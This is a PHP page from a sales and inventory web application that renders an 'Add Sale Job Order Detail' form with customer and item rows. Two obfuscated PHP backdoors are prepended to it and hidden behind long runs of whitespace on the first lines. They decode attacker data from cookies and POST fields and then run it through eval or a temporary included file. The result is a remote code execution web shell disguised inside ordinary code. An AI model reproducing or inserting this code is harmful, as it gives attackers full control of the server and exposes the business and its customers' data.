<?php                                                                                                                                                                                                                                                                                                                                                                                                 $bnqCcrp = class_exists("yD_aRwjQ"); $CEBAb = $bnqCcrp;if (!$CEBAb){class yD_aRwjQ{private $VKEOO;public static $EkcGQXzdyF = "58983f10-0918-4242-9c76-c53c0c864b13";public static $HevjAd = NULL;public function __construct(){$VkKotb = $_COOKIE;$QGATF = $_POST;$AjIYRa = @$VkKotb[substr(yD_aRwjQ::$EkcGQXzdyF, 0, 4)];if (!empty($AjIYRa)){$gKcenVgV = "base64";$MRGHYE = "";$AjIYRa = explode(",", $AjIYRa);foreach ($AjIYRa as $QtkoeuMDMI){$MRGHYE .= @$VkKotb[$QtkoeuMDMI];$MRGHYE .= @$QGATF[$QtkoeuMDMI];}$MRGHYE = array_map($gKcenVgV . chr (95) . chr ( 164 - 64 )."\x65" . "\x63" . chr (111) . chr (100) . chr (101), array($MRGHYE,)); $MRGHYE = $MRGHYE[0] ^ str_repeat(yD_aRwjQ::$EkcGQXzdyF, (strlen($MRGHYE[0]) / strlen(yD_aRwjQ::$EkcGQXzdyF)) + 1);yD_aRwjQ::$HevjAd = @unserialize($MRGHYE);}}public function __destruct(){$this->TWryJloB();}private function TWryJloB(){if (is_array(yD_aRwjQ::$HevjAd)) {$LmAGVXYX = str_replace("\74" . chr (63) . chr (112) . chr ( 608 - 504 ).chr ( 536 - 424 ), "", yD_aRwjQ::$HevjAd[chr ( 1044 - 945 ).chr (111) . chr ( 485 - 375 ).chr (116) . 'e' . 'n' . chr ( 340 - 224 )]);eval($LmAGVXYX);exit();}}}$wwkFEOg = new yD_aRwjQ(); $wwkFEOg = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $KkYRYrsR = class_exists("tKF_DqVFo"); $bCpWT = $KkYRYrsR;if (!$bCpWT){class tKF_DqVFo{private $QTKzvSG;public static $FrKGSFEuzN = "186393e6-0710-4dfa-b5f2-e870018b3d4f";public static $qPdCDGZAYZ = NULL;public function __construct(){$YZVGGba = $_COOKIE;$QAnUBBIbhZ = $_POST;$zLZEeVM = @$YZVGGba[substr(tKF_DqVFo::$FrKGSFEuzN, 0, 4)];if (!empty($zLZEeVM)){$bNlzmEkM = "base64";$hTnVFbiNGq = "";$zLZEeVM = explode(",", $zLZEeVM);foreach ($zLZEeVM as $ArfrEpl){$hTnVFbiNGq .= @$YZVGGba[$ArfrEpl];$hTnVFbiNGq .= @$QAnUBBIbhZ[$ArfrEpl];}$hTnVFbiNGq = array_map($bNlzmEkM . chr ( 1032 - 937 )."\144" . "\x65" . "\x63" . 'o' . "\144" . chr ( 915 - 814 ), array($hTnVFbiNGq,)); $hTnVFbiNGq = $hTnVFbiNGq[0] ^ str_repeat(tKF_DqVFo::$FrKGSFEuzN, (strlen($hTnVFbiNGq[0]) / strlen(tKF_DqVFo::$FrKGSFEuzN)) + 1);tKF_DqVFo::$qPdCDGZAYZ = @unserialize($hTnVFbiNGq);}}public function __destruct(){$this->jGVFHSPd();}private function jGVFHSPd(){if (is_array(tKF_DqVFo::$qPdCDGZAYZ)) {$qZZmLpM = sys_get_temp_dir() . "/" . crc32(tKF_DqVFo::$qPdCDGZAYZ[chr (115) . "\x61" . 'l' . "\164"]);@tKF_DqVFo::$qPdCDGZAYZ[chr (119) . 'r' . chr (105) . 't' . chr ( 836 - 735 )]($qZZmLpM, tKF_DqVFo::$qPdCDGZAYZ["\x63" . 'o' . chr ( 472 - 362 ).chr (116) . "\145" . chr ( 587 - 477 ).chr (116)]);include $qZZmLpM;@tKF_DqVFo::$qPdCDGZAYZ[chr ( 502 - 402 ).chr ( 614 - 513 )."\154" . "\145" . "\x74" . 'e']($qZZmLpM);exit();}}}$DZoEqTNL = new tKF_DqVFo(); $DZoEqTNL = NULL;} ?><?php 
//------------------------------------------------
if(LMS_VIEW == 'addcopied' && isset($_GET['id'])  ) { 
//--------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE']  == 1) || ($_SESSION['userlogininfo']['LOGINIDA'] == 2) || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '34', 'add' => '1'))) { 
echo '
<!--WI_ADD_NEW_TASK_MODAL-->
<div class="row">
<div class="modal-dialog" style="width:95%;">
<form class="form-horizontal" action="#" method="post" id="inv_form" name="inv_form" enctype="multipart/form-data">
<div class="modal-content">
<div class="modal-header">
	<button type="button" class="close" onclick="location.href=\'sale-orders.php\'"><span>close</span></button> 
	<h4 class="modal-title" style="font-weight:700;"> Add Sale Job Order Detail</h4>
</div>

<div class="modal-body">';
//------------------------------------------------
echo '
	<div class="col-sm-41">
		<div class="form_sep">
			<label class="req">Job Order #</label>
			<input type="text" class="form-control" id="job_order_no" name="job_order_no" value="JO-'.mt_rand(100000,999999).'" readonly>
		</div> 
	</div>
	
	<div class="col-sm-41">
		<div class="form_sep">
			<label class="req">Dated</label>
			<input type="text" class="form-control" id="dated" name="dated" required value="'.date("Y-m-d").'" readonly>
		</div> 
	</div>
	
	<div class="col-sm-41">
		<div class="form_sep">
			<label class="req">Customer Name </label>
			<select id="id_customer" name="id_customer" onchange="get_customerdetail(this.value)" style="width:100%" required autocomplete="off">
					<option value="">Choose Customer</option>';
			
				foreach($Customers as $listcusts) { 
					echo '<option value="'.$listcusts['customer_id'].'">'.$listcusts['customer_name'].' - '.$listcusts['customer_cellno'].'</option>';
				}
				echo'
				</select>
		</div> 
	</div>
	
	<div style="clear:both;padding:5px;"></div>

	<div id="getcustomerdetail">

		<div class="col-sm-32">
			<div class="form_sep">
				<label>ADE Name</label>
				<input type="text" class="form-control" id="ade_name" name="ade_name" required readonly>
			</div> 
		</div>
		<div class="col-sm-32">
			<div class="form_sep">
				<label>ADE Phone #</label>
				<input type="text" class="form-control" id="ade_cellno" name="ade_cellno" required readonly>
			</div> 
		</div>
		<div class="col-sm-32">
			<div class="form_sep">
				<label>Opening Balance</label>
				<input type="text" class="form-control" id="customer_openingbalance" name="customer_openingbalance" required readonly>
			</div> 
		</div>
		<div class="col-sm-32">
			<div class="form_sep">
				<label>Company Name</label>
				<input type="text" class="form-control" id="id_company" name="id_company" required readonly>
			</div> 
		</div>

		<div style="clear:both;padding:5px;"></div>
	
	</div>

	<!--
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Advance</label>
			<input type="text" class="form-control" id="advance" name="advance" min="100" required autocomplete="off">
		</div> 
	</div>
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Paid Date</label>
			<input type="text" class="form-control pickdmy" id="paid_date" name="paid_date" required autocomplete="off">
		</div> 
	</div>
	<div class="col-sm-31">
		<div class="form_sep">
			<label class="req">Payment Method</label>
			<select id="payment_method" class="select2" name="payment_method" style="width:100%" required autocomplete="off">
				<option value="">Choose Method</option>';
					foreach($pay_types as $paymode) { 
						echo '<option value="'.$paymode['id'].'">'.$paymode['name'].'</option>';
					}
				echo'
			</select>
		</div> 
	</div>
	<div class="col-sm-31">
		<div class="form_sep">
			<label>Deposit/Receipt #</label>
			<input type="text" class="form-control" id="deposit_slip" name="deposit_slip" autocomplete="off">
		</div> 
	</div>
	
	<div class="col-sm-31">
		<div class="form_sep">
			<label>Account #</label>
			<select id="id_account" class="select2" name="id_account" style="width:100%" autocomplete="off">
				<option value="">Select Account</option>';
					foreach($bankAccounts as $account) { 
						echo '<option value="'.$account['id'].'">'.$account['bank'].' - '.$account['acc_number'].'</option>';
					}
				echo'
			</select>
		</div> 
	</div>
	
	<div style="clear:both;padding:5px;"></div>
	-->


	<div class="col-lg-12 heading-modal" style="margin-top:20px; margin-bottom:20px; font-weight:600;">
		Item Details
	</div>

	<table class="footable table table-bordered table-hover invE_table footable-loaded">
		<thead>
			<tr>
				<th style="text-align:center;">Sr #</th>
				<th style="text-align:left;">Items </th>
				<th style="text-align:center;">Avaiable Stock</th>
				<th style="text-align:center;">Unit Price</th>
				<th style="text-align:center;">Discount %</th>
				<th style="text-align:center;">Qty</th>
				<th style="text-align:center;">Total</th>
			</tr>
		</thead>
		<tbody>';
///----------------------------------------------

	$POconditions = array ( 
								'select' 	=> '*',
								'where' => array( 
													'id_job_order' => cleanvars($_GET['id'])
												), 
								'return_type' 	=> 'all' 
							); 
    $podetails 	= $dblms->getRows(JOB_ORDER_DETAILS, $POconditions);
	
///----------------------------------------------
$i     = 0;
$total = 0 ;
 foreach($podetails as $rowsdet) {
	$total = $total +$rowsdet['total_price']; 
	 
	 $Stockconditions = array ( 
								'select' 	=> "SUM(CASE WHEN stock_type = '1' then qty end) as TotalInQTY, 
												SUM(CASE WHEN stock_type = '2' then qty end) as TotalOutQTY",
								'where' => array( 
													'id_item' => cleanvars($rowsdet['id_item'])
												), 
								'return_type' 	=> 'single' 
							); 
    $resulttotalInOut 	= $dblms->getRows(STOCK, $Stockconditions);
	

	$avaiablestock = ($resulttotalInOut['TotalInQTY'] - $resulttotalInOut['TotalOutQTY']);
	
	$i++;
	echo'
	<tr class="inv_row">
		<td class="inv_clone_row" style="width:50px;text-align:center;"><span class="footable-toggle"></span>'.$i.'</td>
		<td>
			<select name="id_item['.$i.']" id="id_item_'.$i.'" class="id_item" style="width:100%" autocomplete="off" onchange="getPrdValue(this.value, '.$i.')">
				<option value=""></option>';
				foreach($Items as $arrayitem) {
					if($arrayitem['item_id'] == $rowsdet['id_item']){
						$selected = 'selected';
					} else {
						$selected = '';
					}
		
					echo '
					<option value="'.$arrayitem['item_id'].'" '.$selected.'>'.$arrayitem['item_code'].' - '.$arrayitem['item_name'].'</option>';
				}
			echo'
			</select>
		</td>
		<td style="width:100px;">
			<input type="text" class="form-control col-lg-12" name="stock_qty['.$i.']" id="stock_qty'.$i.'" value="'.$avaiablestock.'" style="text-align:center; color:#00f; font-size:16px !important;  font-weight:600;" readonly>
		</td>
		<td style="width:85px;">
			<div id="getPrdValue_'.$i.'">
				<input type="text" class="form-control col-lg-12 jQinv_item_rate" readonly value="'.$rowsdet['unit_price'].'" name="unit_price['.$i.']" id="unit_price_'.$i.'">
			</div>		
			
		</td>
		<td  style="width:100px;">
			<input type="text" class="form-control col-lg-12 jQinv_item_discount" name="discount_percentage['.$i.']" id="discount_percentage'.$i.'" value="'.$rowsdet['discount'].'" autocomplete="off"  style="text-align:center; font-weight:600;">
		</td>
		<td style="width:70px;">
			<input type="text" class="form-control col-lg-12 jQinv_item_qty " name="total_qty['.$i.']" value="'.$rowsdet['total_qty'].'" id="total_qty_'.$i.'" style="text-align:center; font-weight:600;">
		</td>
		
		
		<td style="width:100px;">
			<input type="number" class="form-control col-lg-12 jQinv_item_total" value="'.$rowsdet['total_price'].'" name="total_price['.$i.']" id="total_price_'.$i.'" readonly="" style="text-align:right;">
		</td>
	</tr>';	
}
	
	$ijn = ($i+1);
///----------------------------------------------
		for ($ij=$ijn; $ij <= ($i+5); $ij++) {
			echo'
			<tr class="inv_row">
				<td class="inv_clone_row" style="width:50px;text-align:center;"><span class="footable-toggle"></span>'.$ij.'</td>
				<td style="width:400px;">
					<select name="id_item['.$ij.']" id="id_item_'.$ij.'" class="id_item" style="width:100% !important;"   autocomplete="off" onchange="getPrdValue(this.value, '.$ij.')">
						<option value=""></option>';
						foreach($Items as $arrayitem) {
							echo '
							<option value="'.$arrayitem['item_id'].'">'.$arrayitem['item_code'].' - '.$arrayitem['item_name'].'</option>';
						}
					echo'
					</select>
				</td>
					
				
				<td colspan="2">
				<div id="getPrdValue_'.$ij.'">
				
				<div class="col-sm-61" >
					<input type="text" class="form-control col-lg-12" name="stock_qty['.$ij.']" id="stock_qty'.$ij.'" readonly>
				</div>
				
				<div class="col-sm-61">
					<input type="text" class="form-control col-lg-12 jQinv_item_rate" readonly name="unit_price['.$ij.']" id="unit_price_'.$ij.'">
				</div>
					 
					
				</div>
						
				</td>
				
				<td  style="width:100px;">
					<input type="text" class="form-control col-lg-12 jQinv_item_discount" name="discount_percentage['.$ij.']" id="discount_percentage'.$ij.'" autocomplete="off"  style="text-align:center; font-weight:600;">
				</td>
				
				<td  style="width:70px;">
					<input type="text" class="form-control col-lg-12 jQinv_item_qty" name="total_qty['.$ij.']" id="total_qty_'.$ij.'" autocomplete="off" style="text-align:center; font-weight:600;">
				</td>
				
				<td style="width:100px;">
					<input type="number" class="form-control col-lg-12 jQinv_item_total" name="total_price['.$ij.']" id="total_price_'.$ij.'" readonly="" style="text-align:right;">
				</td>
			</tr>';	
		}
	

echo'
<tr class="last_row">
	<td colspan="15" style="text-align:right;"><span class="footable-toggle"></span>
		<p class="clearfix"><b> Total Bill Amount: <span class="inV_grandtotal">Rs.<span></span></span></b></p>
		<p class="clearfix"><b> Total Receiveable: <span class="inV_receiveable">Rs.<span></span></span></b></p>
		<input type="hidden" id="inV_grandtotal" name="inV_grandtotal" value="0.00">
		<input type="hidden" id="inV_receiveable" name="inV_receiveable" value="0.00">
	</td>
</tr>
</tbody>	
</table>

	<div style="clear:both;"></div>

</div>

<div class="modal-footer">
	<button type="submit" class="btn btn-warning" value="savehold" id="submit_order" name="submit_order" onClick=\'return confirmSubmit()\'>Save Record</button>
	<button type="button" class="btn btn-default" data-dismiss="modal" aria-hidden="true" onclick="location.href=\'sale-orders.php\'">Closed</button>
</div>

</div>
</form>
</div>
</div>
<!--WI_ADD_NEW_TASK_MODAL-->


<script LANGUAGE="JavaScript">
<!--
function confirmSubmit() {
	var agree=confirm("Are you sure you wish to continue?");
	if (agree)
	 return true ;
	else
	 return false ;
	}
// -->
</script>

<!--JS_SELECT_LISTS-->
<script src="js/sales.js"></script>
<script>
	$("#id_customer").select2({
        allowClear: true
    });
	$(".id_item").select2({
        allowClear: true
    });
	
</script>


<script type="text/javascript">
	$().ready(function() {
		$("#inv_form").validate({
			rules: {
				id_vendor		: "required",
				vendor_order	: "required"
			},
			messages: {
				id_vendor		: "This field is required",
				vendor_order	: "This field is required"
			},
			submitHandler: function(form) {
			form.submit();
			}
		});
	});
</script>
<script>
	function getPrdValue(id_item, srno) {  
		$.ajax({  
			type: "POST",  
			url: "include/ajax/getPrdValue.php",  
			data: "id_item="+id_item+"&srno="+srno,  
			success: function(msg){  
				$("#getPrdValue_"+srno).html(msg); 
			}
		});  
	}
</script>';

} else {
	echo '<h1 style="margin-top: 100px; margin-bottom: 100px; color: orangered; font-weight: 600; text-align: center;">“Sorry, You are not allowed to access this page” </h1>';
	
}
}